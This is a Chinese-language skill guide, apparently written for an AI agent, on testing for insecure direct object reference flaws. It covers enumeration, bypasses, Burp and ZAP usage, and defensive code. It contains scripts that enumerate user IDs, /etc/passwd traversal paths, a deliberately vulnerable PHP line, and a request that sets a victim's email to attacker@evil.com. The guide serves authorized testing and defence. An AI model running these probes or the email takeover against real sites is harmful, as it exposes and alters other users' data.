---
name: idor-testing
description: IDOR不安全的直接对象引用测试的专业技能和方法论
version: 1.0.0
---

# IDOR不安全的直接对象引用测试

## 概述

IDOR（Insecure Direct Object Reference）是一种访问控制漏洞，当应用程序直接使用用户提供的输入来访问资源，而未验证用户是否有权限访问该资源时发生。本技能提供IDOR漏洞的检测、利用和防护方法。

## 漏洞原理

应用程序使用可预测的标识符（如ID、文件名）直接引用资源，未验证当前用户是否有权限访问该资源。

**危险代码示例：**
```php
// 直接使用用户输入的ID
$file = file_get_contents('/files/' . $_GET['id'] . '.pdf');
```

## 测试方法

### 1. 识别直接对象引用

**常见资源类型：**
- 用户ID
- 文件ID/文件名
- 订单ID
- 文档ID
- 账户ID
- 记录ID

**常见位置：**
- URL参数
- POST数据
- Cookie值
- HTTP头
- 文件路径

### 2. 枚举测试

**顺序ID测试：**
```
/user?id=1
/user?id=2
/user?id=3
```

**UUID测试：**
```
/user?id=550e8400-e29b-41d4-a716-446655440000
/user?id=550e8400-e29b-41d4-a716-446655440001
```

**文件名测试：**
```
/files/document1.pdf
/files/document2.pdf
/files/invoice_2024_001.pdf
```

### 3. 水平权限测试

**访问其他用户资源：**
```
当前用户ID: 100
测试: /user?id=101
测试: /user?id=102
```

**访问其他用户文件：**
```
/files/user100_document.pdf
测试: /files/user101_document.pdf
```

### 4. 垂直权限测试

**普通用户访问管理员资源：**
```
/admin/users?id=1
/admin/settings
/admin/logs
```

## 利用技术

### 用户信息泄露

**枚举用户资料：**
```bash
# 顺序枚举
for i in {1..1000}; do
  curl "https://target.com/user?id=$i"
done

# 观察响应差异
```

### 文件访问

**访问其他用户文件：**
```
/files/invoice_12345.pdf
/files/report_67890.pdf
/files/contract_11111.pdf
```

**目录遍历结合：**
```
/files/../admin/config.php
/files/../../etc/passwd
```

### 数据修改

**修改其他用户数据：**
```http
POST /api/user/update
Content-Type: application/json

{
  "id": 101,
  "email": "attacker@evil.com"
}
```

### 批量操作

**批量获取数据：**
```python
import requests

for user_id in range(1, 1000):
    response = requests.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")
```

## 绕过技术

### ID混淆

**Base64编码：**
```
原始ID: 123
编码: MTIz
URL: /user?id=MTIz
```

**哈希值：**
```
原始ID: 123
哈希: 202cb962ac59075b964b07152d234b70
URL: /user?id=202cb962ac59075b964b07152d234b70
```

### 参数名混淆

**使用不同参数名：**
```
/user?id=123
/user?uid=123
/user?user_id=123
/user?account=123
```

### HTTP方法绕过

**尝试不同HTTP方法：**
```
GET /user/123
POST /user/123
PUT /user/123
PATCH /user/123
```

### 路径混淆

**尝试不同路径：**
```
/api/v1/user/123
/api/user/123
/user/123
/users/123
```

## 工具使用

### Burp Suite

**使用Intruder：**
1. 拦截请求
2. 发送到Intruder
3. 标记ID参数
4. 使用数字序列或自定义列表
5. 观察响应差异

**使用Repeater：**
1. 手动修改ID
2. 测试不同值
3. 观察响应

### OWASP ZAP

```bash
# 使用ZAP进行IDOR扫描
zap-cli active-scan --scanners all http://target.com
```

### Python脚本

```python
import requests
import json

def test_idor(base_url, user_id_range):
    for user_id in user_id_range:
        url = f"{base_url}/user?id={user_id}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            print(f"User {user_id}: {data.get('email', 'N/A')}")

test_idor("https://target.com", range(1, 100))
```

## 验证和报告

### 验证步骤

1. 确认可以访问未授权的资源
2. 验证可以读取、修改或删除其他用户数据
3. 评估影响（数据泄露、隐私侵犯等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和资源标识符
- 可访问的未授权资源
- 完整的利用步骤和PoC
- 修复建议（访问控制、资源映射等）

## 防护措施

### 推荐方案

1. **访问控制验证**
   ```python
   def get_user_data(user_id, current_user_id):
       # 验证权限
       if user_id != current_user_id:
           raise PermissionDenied("Cannot access other user's data")
       
       # 返回数据
       return db.get_user(user_id)
   ```

2. **间接对象引用**
   ```python
   # 使用映射表
   user_mapping = {
       'abc123': 100,
       'def456': 101,
       'ghi789': 102
   }
   
   def get_user(mapped_id):
       real_id = user_mapping.get(mapped_id)
       if not real_id:
           raise NotFound()
       return db.get_user(real_id)
   ```

3. **基于角色的访问控制**
   ```python
   def check_permission(user, resource):
       if user.role == 'admin':
           return True
       if resource.owner_id == user.id:
           return True
       return False
   ```

4. **资源所有权验证**
   ```python
   def update_user_data(user_id, data, current_user):
       user = db.get_user(user_id)
       
       # 验证所有权
       if user.id != current_user.id and current_user.role != 'admin':
           raise PermissionDenied()
       
       # 更新数据
       db.update_user(user_id, data)
   ```

5. **使用不可预测的标识符**
   ```python
   import uuid
   
   # 使用UUID替代顺序ID
   resource_id = str(uuid.uuid4())
   ```

6. **最小权限原则**
   - 只返回用户有权限访问的数据
   - 使用数据过滤
   - 限制可访问的资源范围

## 注意事项

- 仅在授权测试环境中进行
- 避免访问或修改真实用户数据
- 注意不同资源的访问控制差异
- 测试时注意请求频率，避免触发防护